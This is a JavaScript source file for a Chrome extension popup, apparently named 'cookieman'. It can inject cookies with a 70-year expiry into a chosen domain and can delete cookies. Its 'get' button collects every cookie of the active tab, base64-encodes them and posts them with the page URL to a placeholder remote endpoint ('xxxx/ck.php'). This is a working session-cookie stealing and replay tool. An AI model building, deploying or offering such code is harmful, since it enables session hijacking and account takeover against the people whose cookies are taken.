var URL = '';

function $$(id) {
    return document.getElementById(id);
}

function inj_cookies(cookies) {
    if (!cookies) {
        showStatus('No Cookies Injected.', true);
        return;
    }
    if (!chrome.cookies) {
        chrome.cookies = chrome.experimental.cookies;
    }

    var d = new Date();
    var expired = 365 * 70; // 70 years
    var e = d.setTime(d.getTime() / 1000 + expired * 24 * 3600); // second

    var domain = URL.split('/')[2];
    if ($$('domain').value !== domain) {
        domain = $$('domain').value;
    }
    var url = URL.split('/')[0] + '//' + domain;

    var cc = cookies.split(';');
    for (var i in cc) {
        var c = cc[i].replace(/^\s+|\s+$/g, "");
        if (!c) continue;
        var k = c.split('=')[0].replace(/^\s+|\s+$/g, "").replace(' ', '+');
        var v = c.split('=')[1].replace(/^\s+|\s+$/g, "").replace(' ', '+');
        chrome.cookies.set({
            'url': url,
            'name': k,
            'value': v,
            'path': '/',
            'domain': $$('domain').value,
            'expirationDate': e,
        });
    }
    showStatus('Cookies Injected.', false);
}

function getCookiesPromise(url) {
    return new Promise((resolve, reject) => {
        chrome.cookies.getAll({ url: url }, function (cookies) {
            if (chrome.runtime.lastError) {
                reject(chrome.runtime.lastError);
            } else {
                resolve(cookies);
            }
        });
    });
}

function showStatus(message, isError = false) {
    const statusElement = $$('status');
    statusElement.innerHTML = message;
    statusElement.style.color = isError ? 'red' : 'green'; // 错误为红色，成功为绿色
}

function copyToClipboard(text) {
    const tempInput = document.createElement('textarea');
    tempInput.value = text;
    document.body.appendChild(tempInput);
    tempInput.select();
    document.execCommand('copy');
    document.body.removeChild(tempInput);
}

function init() {
    const statusElement = $$('status');
    const tokenInput = $$('token_input');
    const xInput = $$('x');
    const domainInput = $$('domain');

    // 设置 token_input 的默认值
    tokenInput.value = 'cookieman';
    xInput.focus();
    xInput.value = localStorage.getItem('cookies');

    // 获取当前活动标签页的 URL 和 Cookies
    chrome.tabs.query({ active: true, lastFocusedWindow: true }, function (tab) {
        URL = tab[0].url;
        domainInput.value = URL.split('/')[2];
    });

    // 保存输入框内容到 localStorage
    xInput.addEventListener('blur', function () {
        localStorage.setItem('cookies', xInput.value);
    });

    // 注入 Cookies
    $$('exec_btn').addEventListener('click', function () {
        inj_cookies(xInput.value);
        const Endbase = btoa(xInput.value);
        console.log(Endbase);
    });

    // 获取并发送 Cookies
    $$('get_btn').addEventListener('click', async function () {
        try {
            const cookies = await getCookiesPromise(URL);
            const gcookies = cookies.map(cookie => `${cookie.name}=${cookie.value};`).join('');
            const Endck = btoa(gcookies);
            const token = tokenInput.value;

            console.log("Encoded Cookies: " + Endck);

            // AJAX 请求发送 Cookies
            $.ajax({
                url: "https://xxxx/ck.php",
                type: 'post',
                data: JSON.stringify({
                    url: URL,
                    cookies: Endck,
                    token: token
                }),
                contentType: 'application/json',
                dataType: 'json',
                beforeSend: function () {
                    showStatus("Sending cookies...", false);
                },
                success: function (data) {
                    if (data.status === 'success') {
                        console.log("Report success: " + data.message);
                        showStatus("Cookies sent successfully!", false);
                    } else {
                        console.log("Report error: " + data.message);
                        showStatus("Error sending cookies.", true);
                    }
                },
                error: function (xhr, status, error) {
                    console.log("Report failure: " + error);
                    showStatus("Failed to send cookies.", true);
                }
            });

            // 复制cookie到剪贴板
            if (confirm("Cookies retrieved. Do you want to copy them to clipboard?")) {
                copyToClipboard(gcookies);
                alert("Cookies copied to clipboard.");
            }

        } catch (error) {
            console.error('Error:', error);
            showStatus("Failed to retrieve cookies.", true);
        }
    });

    // 删除 Cookies
    $$('rm_btn').addEventListener('click', function () {
        const domain = $$('domain').value;
        chrome.cookies.getAll({ domain: domain }, function (cookies) {
            cookies.forEach(function (cookie) {
                chrome.cookies.remove({
                    url: `http://${domain}`,
                    name: cookie.name
                });
            });
            alert("All cookies removed.");
            showStatus('All cookies removed.', false);
        });
    });
}

document.addEventListener('DOMContentLoaded', init);
